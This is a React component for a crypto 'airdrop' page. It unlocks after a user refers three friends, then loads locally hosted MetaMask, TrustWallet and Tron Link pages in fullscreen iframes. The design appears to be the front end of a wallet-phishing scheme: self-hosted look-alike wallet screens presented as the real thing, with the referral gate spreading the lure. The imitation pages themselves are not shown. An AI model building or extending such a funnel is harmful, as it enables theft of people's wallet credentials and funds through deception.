import React, { useState, useRef, useEffect } from 'react';
import './Airdrop.css';
import axios from 'axios';

const Airdrop: React.FC = () => {
  const [showMetamaskPage, setShowMetamaskPage] = useState(false);
  const [showTrustWalletPage, setShowTrustWalletPage] = useState(false);
  const [showTronLinkPage, setShowTronLinkPage] = useState(false);
  const [friendsCount, setFriendsCount] = useState(0);
  const iframeRef = useRef<HTMLIFrameElement | null>(null);

  useEffect(() => {
    const fetchFriendsCount = async () => {
      try {
        const telegramId = localStorage.getItem('telegram_id'); // Assuming telegram_id is stored in local storage
        console.log('Retrieved telegram_id from localStorage:', telegramId); // Add this line
        if (!telegramId) {
          throw new Error('No telegram ID found');
        }

        const response = await axios.get('http://127.0.0.1:8000/api/referrals', {
          params: { telegram_id: telegramId }
        });

        console.log('API Response:', response.data); // Add this line

        // Assuming the response data has a 'referrals' field which is an array
        if (response.data && response.data.referrals) {
          setFriendsCount(response.data.referrals.length);
        } else {
          console.error('Invalid response format:', response.data);
        }
      } catch (error) {
        console.error('Error fetching friends count:', error);

        if (error.response) {
          console.error('Response data:', error.response.data);
          console.error('Response status:', error.response.status);
          console.error('Response headers:', error.response.headers);
        } else if (error.request) {
          console.error('Request data:', error.request);
        } else {
          console.error('Error message:', error.message);
        }
      }
    };

    fetchFriendsCount();
  }, []);
  

  const handleAirdropClick = (link: string) => {
    window.location.href = link; // Navigate to the respective wallet page
  };

  const handleMetamaskClick = () => {
    setShowMetamaskPage(true);
    setShowTrustWalletPage(false);
    setShowTronLinkPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const handleTrustWalletClick = () => {
    setShowTrustWalletPage(true);
    setShowMetamaskPage(false);
    setShowTronLinkPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const handleTronLinkClick = () => {
    setShowTronLinkPage(true);
    setShowMetamaskPage(false);
    setShowTrustWalletPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const enterFullscreen = (element: HTMLElement) => {
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if ((element as any).mozRequestFullScreen) { // Firefox
      (element as any).mozRequestFullScreen();
    } else if ((element as any).webkitRequestFullscreen) { // Chrome, Safari, and Opera
      (element as any).webkitRequestFullscreen();
    } else if ((element as any).msRequestFullscreen) { // IE/Edge
      (element as any).msRequestFullscreen();
    }
  };

  return (
    <div className="airdrop-container">
      {friendsCount >= 3 ? (
        <div>
          <h2 className="airdrop-title">Airdrop Available!</h2>
          <button className="airdrop-button" onClick={handleMetamaskClick}>
            Airdrop Now
          </button>
          <div className="wallet-options">
            <h3>Select Your Wallet:</h3>
            <div className="wallet-option" onClick={handleMetamaskClick}>
              <img src="/path/to/metamaskIcon.png" alt="MetaMask" />
              <p>MetaMask</p>
            </div>
            <div className="wallet-option" onClick={handleTrustWalletClick}>
              <img src="/path/to/trustwalletIcon.png" alt="TrustWallet" />
              <p>TrustWallet</p>
            </div>
            <div className="wallet-option" onClick={handleTronLinkClick}>
              <img src="/path/to/tronLinkIcon.png" alt="Tron Link" />
              <p>Tron Link</p>
            </div>
          </div>
        </div>
      ) : (
        <p className="airdrop-message">
          You must refer 3 friends to the app to be eligible for the airdrop.
        </p>
      )}

      {showMetamaskPage && (
        <iframe ref={iframeRef} src="/metamask.html" className="metamask-frame" title="MetaMask Page"></iframe>
      )}

      {showTrustWalletPage && (
        <iframe ref={iframeRef} src="/trustwallet.html" className="trustwallet-frame" title="TrustWallet Page"></iframe>
      )}

      {showTronLinkPage && (
        <iframe ref={iframeRef} src="/tron.html" className="tronlink-frame" title="Tron Link Page"></iframe>
      )}
    </div>
  );
};

export default Airdrop;
